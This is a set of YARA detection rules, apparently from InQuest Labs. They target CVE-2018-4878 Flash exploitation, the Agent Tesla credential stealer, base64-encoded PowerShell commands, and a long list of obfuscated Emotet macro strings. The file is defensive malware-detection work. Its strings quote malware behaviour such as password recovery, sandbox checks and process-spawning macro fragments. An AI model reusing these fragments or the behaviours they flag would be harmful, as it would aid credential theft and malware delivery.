/*
Generically detect exploitation of CVE-2018-4878, a use-after-free vulnerability affecting Adobe Flash versions up to
and including 28.0.0.137. Following the conversation at:

    http://blog.inquest.net/blog/2018/02/07/cve-2018-4878-adobe-flash-0day-itw
    https://twitter.com/i/moments/960633253165191170

 InQuest customers can detect related events on their network by searching for:
 
    event ID 5000805
*/

rule Adobe_Flash_DRM_Use_After_Free
{    
    meta:
        note  = "This YARA rule is intended to run atop of decompiled Flash."

    strings:
        $as   = "package"
        $exp1 = "import com.adobe.tvsdk.mediacore" 	// covers .*
        $exp2 = "createDispatcher("
        $exp3 = "createMediaPlayer("
        $exp4 = "drmManager.initialize("    		// com.adobe.tvsdk.mediacore.DRMOperationCompleteListener;
        $vara_1 = "push(this)"
        $vara_2 = "push(null)"
        $vara_3 = /pop\(\)\..+\s*=\s*.+pop\(\)/
        $varb_1 = /push\([^\)]{1,24}drmManager.initialize/

        // all the requisite pieces in a single function.
        $varc_1 = /\{[^\}]+createDispatcher\s*\([^\}]+createMediaPlayer\s*\([^\}]+drmManager\.initialize\s*\([^\}]+=\s*null[^\}]+\}/

    condition:
        $as at 0 and all of ($exp*) and (all of ($vara*) or $varb_1 or $varc_1)
}
rule AgentTesla
{
    meta:
        author = "InQuest Labs"
        source = "http://blog.inquest.net/blog/2018/05/22/field-notes-agent-tesla-open-directory/"
        created = "05/18/2018"
        TLP = "WHITE"
    strings:
        $s0 = "SecretId1" ascii
        $s1 = "#GUID" ascii
        $s2 = "#Strings" ascii
        $s3 = "#Blob" ascii
        $s4 = "get_URL" ascii
        $s5 = "set_URL" ascii
        $s6 = "DecryptIePassword" ascii
        $s8 = "GetURLHashString" ascii
        $s9 = "DoesURLMatchWithHash" ascii

        $f0 = "GetSavedPasswords" ascii
        $f1 = "IESecretHeader" ascii
        $f2 = "RecoveredBrowserAccount" ascii
        $f4 = "PasswordDerivedBytes" ascii
        $f5 = "get_ASCII" ascii
        $f6 = "get_ComputerName" ascii
        $f7 = "get_WebServices" ascii
        $f8 = "get_UserName" ascii
        $f9 = "get_OSFullName" ascii
        $f10 = "ComputerInfo" ascii
        $f11 = "set_Sendwebcam" ascii
        $f12 = "get_Clipboard" ascii
        $f13 = "get_TotalFreeSpace" ascii
        $f14 = "get_IsAttached" ascii

        $x0 = "IELibrary.dll" ascii wide
        $x1 = "webpanel" ascii wide nocase
        $x2 = "smtp" ascii wide nocase
        
        $v5 = "vmware" ascii wide nocase
        $v6 = "VirtualBox" ascii wide nocase
        $v7 = "vbox" ascii wide nocase
        $v9 = "avghookx.dll" ascii wide nocase

        $pdb = "IELibrary.pdb" ascii
    condition:
        (
            (
                5 of ($s*) or 
                7 of ($f*)
            ) and
            all of ($x*) and 
            all of ($v*) and
            $pdb
        )
}
rule Base64_Encoded_Powershell_Directives
{
    meta:
        Author      = "InQuest Labs"
        Reference   = "https://inquest.net/blog/2019/07/19/base64-encoded-powershell-pivots"
        Samples     = "https://github.com/InQuest/malware-samples/tree/master/2019-07-Base64-Encoded-Powershell-Directives"
        Description = "This signature detects base64 encoded Powershell directives."

    strings:
        // Copy-Item
        $enc01 = /(Q\x32\x39weS\x31JdGVt[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]Db\x33B\x35LUl\x30ZW[\x30-\x33]|[\x2b\x2f-\x39A-Za-z][\x30EUk]NvcHktSXRlb[Q-Za-f])/

        // ForEach-Object
        $enc02 = /(Rm\x39yRWFjaC\x31PYmplY\x33[Q-T]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]Gb\x33JFYWNoLU\x39iamVjd[A-P]|[\x2b\x2f-\x39A-Za-z][\x30EUk]ZvckVhY\x32gtT\x32JqZWN\x30[\x2b\x2f-\x39A-Za-z])/

        // Get-ChildItem
        $enc03 = /(R\x32V\x30LUNoaWxkSXRlb[Q-Za-f]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]HZXQtQ\x32hpbGRJdGVt[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x30EUk]dldC\x31DaGlsZEl\x30ZW[\x30-\x33])/

        // Get-ItemPropertyValue
        $enc04 = /(R\x32V\x30LUl\x30ZW\x31Qcm\x39wZXJ\x30eVZhbHVl[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]HZXQtSXRlbVByb\x33BlcnR\x35VmFsdW[U-X]|[\x2b\x2f-\x39A-Za-z][\x30EUk]dldC\x31JdGVtUHJvcGVydHlWYWx\x31Z[Q-Za-f])/

        // Get-Random
        $enc05 = /(R\x32V\x30LVJhbmRvb[Q-Za-f]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]HZXQtUmFuZG\x39t[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x30EUk]dldC\x31SYW\x35kb\x32[\x30-\x33])/

        // Join-Path
        $enc06 = /(Sm\x39pbi\x31QYXRo[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]Kb\x32luLVBhdG[g-j]|[\x2b\x2f-\x39A-Za-z][\x30EUk]pvaW\x34tUGF\x30a[A-P])/

        // Move-Item
        $enc07 = /(TW\x39\x32ZS\x31JdGVt[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]Nb\x33ZlLUl\x30ZW[\x30-\x33]|[\x2b\x2f-\x39A-Za-z][\x30EUk]\x31vdmUtSXRlb[Q-Za-f])/

        // New-Item
        $enc08 = /(TmV\x33LUl\x30ZW[\x30-\x33]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]OZXctSXRlb[Q-Za-f]|[\x2b\x2f-\x39A-Za-z][\x30EUk]\x35ldy\x31JdGVt[\x2b\x2f-\x39A-Za-z])/

        // New-Object
        $enc09 = /(TmV\x33LU\x39iamVjd[A-P]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]OZXctT\x32JqZWN\x30[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x30EUk]\x35ldy\x31PYmplY\x33[Q-T])/

        // Out-String
        $enc10 = /(T\x33V\x30LVN\x30cmluZ[\x2b\x2f-\x39w-z]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]PdXQtU\x33RyaW\x35n[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x30EUk]\x39\x31dC\x31TdHJpbm[c-f])/

        // Remove-Item
        $enc11 = /(UmVtb\x33ZlLUl\x30ZW[\x30-\x33]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]SZW\x31vdmUtSXRlb[Q-Za-f]|[\x2b\x2f-\x39A-Za-z][\x31FVl]JlbW\x39\x32ZS\x31JdGVt[\x2b\x2f-\x39A-Za-z])/

        // Select-Object
        $enc12 = /(U\x32VsZWN\x30LU\x39iamVjd[A-P]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]TZWxlY\x33QtT\x32JqZWN\x30[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x31FVl]NlbGVjdC\x31PYmplY\x33[Q-T])/

        // Sort-Object
        $enc13 = /(U\x32\x39ydC\x31PYmplY\x33[Q-T]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]Tb\x33J\x30LU\x39iamVjd[A-P]|[\x2b\x2f-\x39A-Za-z][\x31FVl]NvcnQtT\x32JqZWN\x30[\x2b\x2f-\x39A-Za-z])/

        // Split-Path
        $enc14 = /(U\x33BsaXQtUGF\x30a[A-P]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]TcGxpdC\x31QYXRo[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x31FVl]NwbGl\x30LVBhdG[g-j])/

        // Test-Path
        $enc15 = /(VGVzdC\x31QYXRo[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]UZXN\x30LVBhdG[g-j]|[\x2b\x2f-\x39A-Za-z][\x31FVl]Rlc\x33QtUGF\x30a[A-P])/

        // Write-Host
        $enc16 = /(V\x33JpdGUtSG\x39zd[A-P]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]Xcml\x30ZS\x31Ib\x33N\x30[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x31FVl]dyaXRlLUhvc\x33[Q-T])/

        // [Convert]::FromBase64String
        $enc17 = /([\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx][\x30\x32Dlu-vy][O]jpGcm\x39tQmFzZTY\x30U\x33RyaW\x35n[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x30\x32-\x33EG-HUW-Xkm-n][\x34\x38IMQUY]\x36OkZyb\x32\x31CYXNlNjRTdHJpbm[c-f]|[QZb-d][DTjz]o\x36RnJvbUJhc\x32U\x32NFN\x30cmluZ[\x2b\x2f-\x39w-z])/

    condition:
            any of ($enc*)
}
rule ClamAV_Emotet_String_Aggregate
{
    meta:
        Author      = "InQuest Labs"
        URL         = "https://github.com/InQuest/yara-rules"
        Description = "A pruned aggregate of all Emotet related strings extracted from ClamAV on 2019-07-03."

    strings:
        $ = "\"A\", \"w\", \"E\", \"C\", \"j\", \"d\", \"Fc\", \"I\", _"
        $ = "\"B\", \"P\", \"wW\", \"Z\", \"iw\", \"UH\", \"c\", \"F\")"
        $ = "\"DR\", \"i\", \"O\", \"w\", \"O\", \"W\", \"Ju\", \"l\", _"
        $ = "\"E\", \"vr\", \"d\", \"h\", \"z\", \"O\", \"k\", \"Fm\", _"
        $ = "\"EG\", \"v\", \"aF\", \"L\", \"i\", \"s\", \"qN\", \"KK\", _"
        $ = "\"Er\", \"rG\", \"Pn\", \"vW\", \"JJ\", \"h\", \"Kj\", \"Ah\", _"
        $ = "\"V\", \"oT\", \"l\", \"hn\", \"EE\", \"Hp\", \"jT\", \"r\", _"
        $ = "\"Zr\", \"wq\", \"V\", \"V\", \"a\", \"R\", \"S\", \"m\", _"
        $ = "\"co\", \"ol\", \"qw\", \"W\", \"K\", \"ZX\", \"V\", \"kM\", _"
        $ = "\"ip\", \"I\", \"Dk\", \"z\", \"I\", \"H\", \"Ko\", \"q\")"
        $ = "\"q\", \"Pk\", \"Bz\", \"w\", \"XT\", \"Sr\", \"B\", \"zu\", _"
        $ = "\"qz\", \"W\", \"O\", \"jB\", \"G\", \"m\", \"Wc\", \"c\", _"
        $ = "\"s\", \"mA\", \"Ql\", \"ln\", \"C\", \"wG\", \"l\", \"iu\", _"
        $ = "\"v\", \"W\", \"c\", \"nm\", \"R\", \"Za\", \"SH\", \"Y\", _"
        $ = "\"zZ\", \"n\", \"B\", \"Rd\", \"zb\", \"zw\", \"S\", \"To\")"
        $ = "BbLaumnc = Sqr(297301610 / CSng(84122969 - Cos(37521102 - 276382110) + jArhKK + Rnd(278702609 - 22664827)))"
        $ = "CjONpTOBY = NkdjH"
        $ = "EimOtQW = fkipfviwF"
        $ = "GPYKuJmPN = CDate(KROMo)"
        $ = "GSwdf = Hex(pZRQKYfG)"
        $ = "GbzcjjsOu = 57201732"
        $ = "GqMKodDv = CDate(GKtvO)"
        $ = "HkWVBQV = Oct(JiJAvfM)"
        $ = "HtAbZ = Int(161244399 * jTBFrt)"
        $ = "JaiAhE = CDate(283733543)"
        $ = "KbYRtc = CDate(PTGTls)"
        $ = "LfRjb = Sqr(305831286 / CSng(76527194 - Cos(189554916 - 4228452) + CVSjZwckw + Rnd(255191871 - 82381179)))"
        $ = "Lodma = Sqr(158611452 / CSng(53399989 - Cos(228303053 - 164016825) + SlZNGGPBm + Rnd(77667323 - 270228088)))"
        $ = "MzQnuKYi = Sqr(224971823 / CSng(272274480 - Cos(303612726 - 72935234) + TKtLB + Rnd(294479071 - 259499898)))"
        $ = "NvGwwkV = Hex(BEjDXd)"
        $ = "PHFllzzhd = CDate(336713111)"
        $ = "PXvTHzt = Sqr(128431312 / CSng(233496515 - Cos(35314610 - 292196268) + bwWOWw + Rnd(118649096 - 251935681)))"
        $ = "QNbziqW = Sqr(158805557 / CSng(331003561 - Cos(249131549 - 186665267) + aRQQu + Rnd(267242902 - 158055032)))"
        $ = "UUJpKPIH = 280449576"
        $ = "VlrZSE = 299451022"
        $ = "XZtzA = qvCHUwVZO"
        $ = "YHWXG = 150069403"
        $ = "ZRapb = 64895411"
        $ = "ZWDJk = Hex(jbhukX)"
        $ = "ZhUrIji = Int(118016430 * tUEpB)"
        $ = "ZhZlvfXG = CDate(IofMUlj)"
        $ = "aVzNNi = CLng(57406342)"
        $ = "batQK = 303397753"
        $ = "bnmLiEQ = CDate(39447712)"
        $ = "cJAjYZjMI = 281370206"
        $ = "hlhjKc = mtfQh"
        $ = "hrIdd = CLng(151925004)"
        $ = "iobZdiJ = ChrW(159326751)"
        $ = "jiWvdw = 233631985"
        $ = "kjrUz = ChrW(25661779)"
        $ = "lVzOp = iIDfQWBY"
        $ = "lmYcoF = CDate(jbAfYLdM)"
        $ = "mPHwrFSM = CDate(KFAdkRt)"
        $ = "mSbTWQh = CDate(198464871)"
        $ = "mcPSLjlC = Int(22534269 * bUKsQ)"
        $ = "mwpmbE = abhBLvRE"
        $ = "nTNrqV = CDate(SUzXWuZm)"
        $ = "noOjltQ = Oct(aoWXjNBOw)"
        $ = "ocsLjZ = wWWvwT"
        $ = "ohFjViK = CLng(94026124)"
        $ = "qMCQMQP = Oct(jUipORjds)"
        $ = "qTfbQTYSq = 241712008"
        $ = "qwZwJjK = Sqr(81091076 / CSng(214691539 - Cos(2246847 - 11439174) + dILFMdpS + Rnd(84892047 - 176965475)))"
        $ = "rAcul = dfhMTK"
        $ = "skEjlXnf = 320215791"
        $ = "tIXNtk = Sqr(240178619 / CSng(301643513 - Cos(31914199 - 192782238) + YQFirjuqi + Rnd(111920305 - 25450526)))"
        $ = "tIiiWaz = dKMBcjniu"
        $ = "tWpMw = CLng(43829233)"
        $ = "tilquXtzk = 266433336"
        $ = "uFZka = jEjZqA"
        $ = "vBzpGKc = Hex(AmafXFSL)"
        $ = "wFTzivB = Hex(rPOuRKXU)"
        $ = "wjFJo = Hex(TlDojE)"
        $ = "zvOIvIQ = 186460771"
        $ = "BjiMS = 309251431 + Oct(173155768) - 283161521 - CBool(335825026 / 132218507) * 55370527 + Log(nLuUjMFGu - CLng(308671783)) - 134483356 + Hex(VzmWF)"
        $ = "Case 106092274"
        $ = "Case 11454302"
        $ = "Case 143120012"
        $ = "Case 154779694"
        $ = "Case 170116777"
        $ = "Case 189594986"
        $ = "Case 205744771"
        $ = "Case 228088127"
        $ = "Case 233192990"
        $ = "Case 247483045"
        $ = "Case 252250112"
        $ = "Case 264557124"
        $ = "Case 266083784"
        $ = "Case 276573924"
        $ = "Case 278426237"
        $ = "Case 278864415"
        $ = "Case 332550632"
        $ = "Case 336599014"
        $ = "Case 337721066"
        $ = "Case 341340570"
        $ = "Case 38445923"
        $ = "Case 44630363"
        $ = "Case 457529"
        $ = "Case 52629287"
        $ = "Case 54855370"
        $ = "Case 71914715"
        $ = "Case 72734952"
        $ = "Case 83662727"
        $ = "Case 92027715"
        $ = "Case 94959251"
        $ = "UwFuzNw = Sgn(CXIrlX)"
        $ = "dOrsk = Sgn(wutduKITM)"
        $ = "hZBzQjPcR = uamCCaJ"
        $ = "onUqBpwLN = 82127321 + Oct(182722426) - 318417404 - CBool(161630097 / 169773907) * 46426675 + Log(BkzCQl - CLng(115674427)) - 290082511 + Hex(iCcTIhG)"
        $ = "If lLpXknlEZ Xor krikqDT Then"
        $ = "Select Case AHHLF"
        $ = "Select Case VLdwEK"
        $ = "Select Case YOThc"
        $ = "Select Case ZDjQpzlT"
        $ = "Select Case oErsqBA"
        $ = "Select Case wMoAPPbB"
        $ = "Error IVdTTI + JqPUSU + bKEGNY + fSEHr * wUsTKJ + wYNAN + (bDUMEp + ZwMGp)"
        $ = "Error hdvow + tphap - rozVTT + WvVwc + nwkhi + cinTH - YnHlpB + DVdMQ - fAtXdM + TcJZIH + TMwDV + jvfMkF"
        $ = "Error hojRZ + fYZMt / kLuORO + qLTjd + IPofAc + Gbpvz - (fjmOS + waziDJ + CWwzOF + iQKqt + (kjlJW + PGipEw))"
        $ = "FormatNumber MaUVi + QlPhT / (qlqsQs + ttIHB + QZafUt + QKnwYp * (PhInFI + dWKlTz + taETS + ScpGun))"
        $ = "HOzldP = 33235 * dAojBv + 22013 / nLEvn"
        $ = "HOzldP = 98772 * nOWSp + sBlTo - asjVO"
        $ = "HOzldP = Log(7)"
        $ = "IsArray 25855 + rdDbP + tNCwEo - hRPpw"
        $ = "TimeValue (KUTwat + BihLSP * (TRjIO + IBzmq + (lbcHr + hEpPzZ)))"
        $ = "TimeValue (NlbKir + LudNjh) / JEjSDi + WtKSQ + uCnbbT + BikpW"
        $ = "TimeValue zuUbIw + lVBtJ / DPtBvm + kjcFG + nrBsS + uwYPRr"
        $ = "VarType LCase(68)"
        $ = "VarType Rnd(685)"
        $ = "XJwIVwuI = (obXlRcwfG - CDbl(20641839) / RJDio + Sgn(254461154)) - 139223241 + CInt(qiTDjZlsK) - 59679732 * Fix(53539363 * Oct(DJvEpFnD))"
        $ = "fWWvfEqH = Array(\"T\", \"zr\", \"J\", \"FM\", \"UX\", \"ho\", \"v\", \"m\", _"
        $ = "For Each OwqOz In fzGZRzND"
        $ = "For Each WjnHrtjz In twtiSZwQc"
        $ = "For Each jBwnIABM In TZwiwXp"
        $ = "& fhc1OBWLx _"
        $ = "& q1z5K _"
        $ = "* 971021366 / 369160997 + Log(EQQo_Q_"
        $ = "* CDate(RAAA_c * ChrW(789459752 / CDate(ZQQABoD)))) _"
        $ = "+ \"mts:w\" + \"in32\" + \"_proc\" _"
        $ = "+ \"n\" + \"mg\" _"
        $ = "+ \"ocess\" + \"S\" + \"tartup"
        $ = "+ \"s:Wi\" + \"n3\" + \"2_Pr\" _"
        $ = "+ \"tartup"
        $ = "+ (\"264\") + (\"VUcid9b\" + (\"587\" + \"45\") + \"GNB7qA2\" + (\"PN2ailr0"
        $ = "+ (\"722\") + (\"ZBDvJzoR\" + (\"755\" + \"879\") + \"sa34d4\" + (\"d2iIdSN"
        $ = "+ (\"788\") + (\"hPlD3NoI\" + (\"757\" + \"842\") + \"IwZKKI6\" + (\"i7C2YT"
        $ = "+ (i089968) + u46626 _"
        $ = "+ (i1711884) + Y241176 _"
        $ = "+ (l__597) + c0_459 _"
        $ = "+ (m2388692) + L447996 _"
        $ = "+ (t_423055) + D017109 _"
        $ = "+ Int(L42114) + u480484 + Int(968) _"
        $ = "+ V_45800 + Int(674) + u598_083 + h274_2_ + 325 + E2_46145"
        $ = "+ Y9663271 + Int(245) + s351563 + K_3097 + 166 + O098_73"
        $ = "+ u24154 + Int(275) + f05_054 + V_0385 + 167 + Q8_255"
        $ = "+ z678286 + 337485637"
        $ = "- CBool(744026654) / KUADQ_Ax - _"
        $ = ".Print \"167\" _"
        $ = ".Print \"235\" _"
        $ = ".Print \"910\" _"
        $ = ".Shell(iihfU, jChzFM), YXtwPRj)"
        $ = "0,18,50,35"
        $ = "0:4174747269627574652056425f4e616d65203d202241617a4446757a22"
        $ = "0:4174747269627574652056425f4e616d65203d2022424e43617a66466a755275704422"
        $ = "0:4174747269627574652056425f4e616d65203d20224843484d746c465a6a22"
        $ = "0:4174747269627574652056425f4e616d65203d20224e745657704e4461634c58666b6922"
        $ = "0:4174747269627574652056425f4e616d65203d20224f7244744c5873556a69436c7022"
        $ = "0:4174747269627574652056425f4e616d65203d2022566c6a57584a7a22"
        $ = "0:4174747269627574652056425f4e616d65203d2022576948535866466b7a5922"
        $ = "0:4174747269627574652056425f4e616d65203d202257695a7a4444444f6b7722"
        $ = "0:4174747269627574652056425f4e616d65203d2022586750524630333522"
        $ = "0:4174747269627574652056425f4e616d65203d2022685951554557767470706122"
        $ = "0:4174747269627574652056425f4e616d65203d20226d48414e6b7a704d22"
        $ = "0:4174747269627574652056425f4e616d65203d20226d547761564f777422"
        $ = "0:4174747269627574652056425f4e616d65203d20227676487a705664516d6c50536a22"
        $ = "0a20a7ja270E70"
        $ = "100129994"
        $ = "106885034"
        $ = "109593058"
        $ = "116477639"
        $ = "11661310"
        $ = "117793057"
        $ = "118581505"
        $ = "119120316"
        $ = "120193573"
        $ = "122995335"
        $ = "126278805"
        $ = "126p126X4"
        $ = "131182809"
        $ = "146151880"
        $ = "152501303"
        $ = "153272416"
        $ = "155512407"
        $ = "16127587"
        $ = "173392967"
        $ = "180521468"
        $ = "181567594"
        $ = "188643686"
        $ = "191) + iPhMlbkN"
        $ = "19;26;43"
        $ = "207926327"
        $ = "208231696"
        $ = "209266480"
        $ = "213075158"
        $ = "21443318"
        $ = "22,22,41"
        $ = "220246866"
        $ = "22P108x1"
        $ = "23292253"
        $ = "233440611"
        $ = "235666267"
        $ = "237268900"
        $ = "243561327"
        $ = "248196837"
        $ = "253504504"
        $ = "255442848"
        $ = "257199540"
        $ = "264051008"
        $ = "269610872"
        $ = "270528015"
        $ = "280524880 - hAAAQAXB / wQABUUQx - Tan(118770473"
        $ = "285250695"
        $ = "286329143"
        $ = "294542035"
        $ = "295329648"
        $ = "307021049"
        $ = "307129179"
        $ = "309748135"
        $ = "310325231"
        $ = "316457819"
        $ = "32,27,60"
        $ = "322065214"
        $ = "326063447"
        $ = "32_Process\")).Create# LDG3FL, Czl1lInR, rksq5icm, wWNvOivN"
        $ = "333127255"
        $ = "335333058"
        $ = "357573364"
        $ = "359022593"
        $ = "362224930"
        $ = "394101855"
        $ = "394595464"
        $ = "401059716"
        $ = "427528300"
        $ = "434653231"
        $ = "441773021"
        $ = "446238501"
        $ = "451942070"
        $ = "466952686"
        $ = "46;41;77;7"
        $ = "47;71;8;33"
        $ = "481272899"
        $ = "481768994"
        $ = "483656317"
        $ = "496888487"
        $ = "4E69!76!1k"
        $ = "505287444"
        $ = "511869992"
        $ = "531109272"
        $ = "55599325"
        $ = "565231638"
        $ = "568842327"
        $ = "571\" + (\"844\") + (\"XUrtUowo\" + (\"208\" + \"85\") + \"dAf8Nd\" + (\"VS2cAhuq"
        $ = "588854775"
        $ = "590745234"
        $ = "593798217"
        $ = "595449481"
        $ = "5o12o8_95"
        $ = "607085817"
        $ = "630\" + (\"152\") + (\"MDCaz7n\" + (\"879\" + \"953\") + \"UwH4WoR\" + (\"jXh9PBV"
        $ = "631583992"
        $ = "636310124"
        $ = "644) + cYGHYb"
        $ = "645065928"
        $ = "64551552 * Hex(930023985 * _"
        $ = "659489749"
        $ = "65;65;65"
        $ = "662824139"
        $ = "66728700"
        $ = "675223502"
        $ = "685213722"
        $ = "69,62,22"
        $ = "695897279 - tAAcBA / BDQAAw - Tan(822702749"
        $ = "6;8;36;75"
        $ = "71,65,15"
        $ = "71231191"
        $ = "716658540"
        $ = "73222753"
        $ = "739469662"
        $ = "748\" + (\"853\") + (\"R4oDMqO\" + (\"737\" + \"650\") + \"CtwNJu\" + (\"IVOMH0wn"
        $ = "75102559"
        $ = "754677693"
        $ = "768003727"
        $ = "77665428"
        $ = "78023260"
        $ = "78098758"
        $ = "787669236"
        $ = "799149985"
        $ = "7_124J99"
        $ = "804572183"
        $ = "807356145"
        $ = "81,29,68"
        $ = "813357237"
        $ = "818673481"
        $ = "82136797"
        $ = "82981355"
        $ = "841074043"
        $ = "84471752"
        $ = "851226700"
        $ = "875954121 / Sgn(737941199) * (AAAUAAZ + CVar(520001770"
        $ = "8>3_97K11"
        $ = "90191876"
        $ = "911374040"
        $ = "95552863"
        $ = "957157475"
        $ = "97457890"
        $ = "975199089"
        $ = "977541618"
        $ = "982295035"
        $ = "994\" + (\"770\") + (\"ikqIW9jY\" + (\"410\" + \"559\") + \"o_uUQO\" + (\"Sc7z76"
        $ = "998318633"
        $ = "= 729503958 - _"
        $ = "= 81793 + Atn(62659) / 92776 / _"
        $ = "= CStr(LAAABAx + 888042072 + 920531570 _"
        $ = "= Hex(402514940"
        $ = "= aBkkQC"
        $ = "A0523292"
        $ = "A482367_K77951q140_878V3_462"
        $ = "A4AAXUD = 181341305 - ChrB(2559126 * Round(651620675) + WUQAkw - ChrB(ABkA1oGQ)) / nAxkAUo / Rnd(663640487 / QDDk4A * SpBb / Chr"
        $ = "AAAAAD41"
        $ = "AAAUAUDD"
        $ = "ADowIECwu"
        $ = "AEbWwmZGAjzBAhzHwhXrGow"
        $ = "AFzwbGAj"
        $ = "ALFlHisskZra"
        $ = "APpZnx9g(11) = \"byIpQt1Os"
        $ = "AQXAAUoB"
        $ = "AQwuqitCS = lBGnjRIG + azvQYmSjic + nlBSwazY + kGSmjCdA + qjcdjvG + IfzvP + KSTCWjRT"
        $ = "ASABBAHIA"
        $ = "A_3_68_ = (190967908"
        $ = "ActiveDocument.BuiltInDocumentProperties(\"Comments\")"
        $ = "AiHuiEuq"
        $ = "AmVqNCn7"
        $ = "AppActivate 224602168"
        $ = "AppActivate 263"
        $ = "AppActivate 626"
        $ = "AppActivate CDbl(955"
        $ = "AppActivate CSng(28893 + KzluMZ"
        $ = "AppActivate ChrB(JGYhJa"
        $ = "AppActivate Hex(8037"
        $ = "AppActivate Hex(NoPWBD"
        $ = "AppActivate Round(bwBYFw"
        $ = "AppActivate Sgn(QTcJBp"
        $ = "AppActivate mKiIIo"
        $ = "AppActivate wBPlM"
        $ = "Asc(MDQAZx"
        $ = "Asc(RAc1XDD"
        $ = "Asc(iDGwwA"
        $ = "Atn(312653131"
        $ = "Atn(58212323"
        $ = "Atn(60148"
        $ = "Atn(614474390"
        $ = "Atn(627266553"
        $ = "Atn(676909037"
        $ = "Atn(767735314"
        $ = "Atn(779968282"
        $ = "Atn(967875984"
        $ = "Atn(BG_A_AB"
        $ = "Atn(VXLmLb"
        $ = "Atn(fcSsNbq"
        $ = "Atn(sNOVcw"
        $ = "Attribute VB_Base = \"0{0A5FB00E-D718-41CC-9F16-C8FEF46C3ACD}{61BC3D54-1463-4DFA-B77B-B2799E590BA5}"
        $ = "Attribute VB_Base = \"0{0B7760E4-24B1-4EA8-83E8-7C8120774294}{4EE64FEA-4D69-4EC0-A65A-16BDDD64BD2E}"
        $ = "Attribute VB_Base = \"0{8411D7C6-E63B-407B-BD8C-F3BBE1DDA996}{5FCC6A50-C6BB-4371-98C5-75CC1C702E38}"
        $ = "Attribute VB_Base = \"0{8C95744E-5F3D-487F-964B-2747704AF649}{F4630A7E-3C1F-4513-B4F7-B4DE18C5AB21}"
        $ = "Attribute VB_Base = \"0{9F8B55CD-B6F0-4DA4-AB50-70E9C7FA2034}{5B07E719-5147-4613-976E-888249BCE951}"
        $ = "Attribute VB_Base = \"0{C1A5688F-8A34-49B0-8F55-EFF4989335E6}{FDAD0313-DC72-4D8D-8329-E9DB31704FB0}"
        $ = "Attribute VB_Base = \"0{DBF9D248-A1E3-4610-B915-D5E26924687C}{144EA630-6A64-4AA4-8696-DAE616E571E6}"
        $ = "Attribute VB_Base = \"0{E1349350-99E0-4A72-90F3-1977DB684D66}{83EDA91E-4E8B-4958-96BB-65346C640174}"
        $ = "Attribute VB_Base = \"0{FB6352A4-015F-40AE-940E-DFEF496155BC}{6A887CBC-6F52-456C-997C-2C3C6AC55011}"
        $ = "Attribute VB_Control = \"A0523292, 5, 5, MSForms, TextBox"
        $ = "Attribute VB_Control = \"B7zidj, 2, 2, MSForms, ComboBox"
        $ = "Attribute VB_Control = \"BbHdEn, 1, 1, MSForms, ComboBox"
        $ = "Attribute VB_Control = \"E606327, 1, 1, MSForms, TextBox"
        $ = "Attribute VB_Control = \"H_226448, 2, 2, MSForms, TextBox"
        $ = "Attribute VB_Control = \"P8jBzNa, 0, 0, MSForms, ComboBox"
        $ = "Attribute VB_Control = \"RCtXzHqR, 1, 1, MSForms, TextBox"
        $ = "Attribute VB_Control = \"SZS63zu, 0, 0, MSForms, TextBox"
        $ = "Attribute VB_Control = \"X55394, 4, 4, MSForms, TextBox"
        $ = "Attribute VB_Control = \"awsaanQB, 0, 0, MSForms, ComboBox"
        $ = "Attribute VB_Control = \"b1jOhv, 1, 1, MSForms, TextBox"
        $ = "Attribute VB_Control = \"kmi5rho, 2, 2, MSForms, ComboBox"
        $ = "Attribute VB_Control = \"mSRp5U, 0, 0, MSForms, ComboBox"
        $ = "Attribute VB_Control = \"n00dj7, 1, 1, MSForms, ComboBox"
        $ = "Attribute VB_Control = \"n928_112, 0, 0, MSForms, TextBox"
        $ = "Attribute VB_Control = \"pMW1ir5, 2, 2, MSForms, ComboBox"
        $ = "Attribute VB_Control = \"qzKwvQ, 2, 2, MSForms, ComboBox"
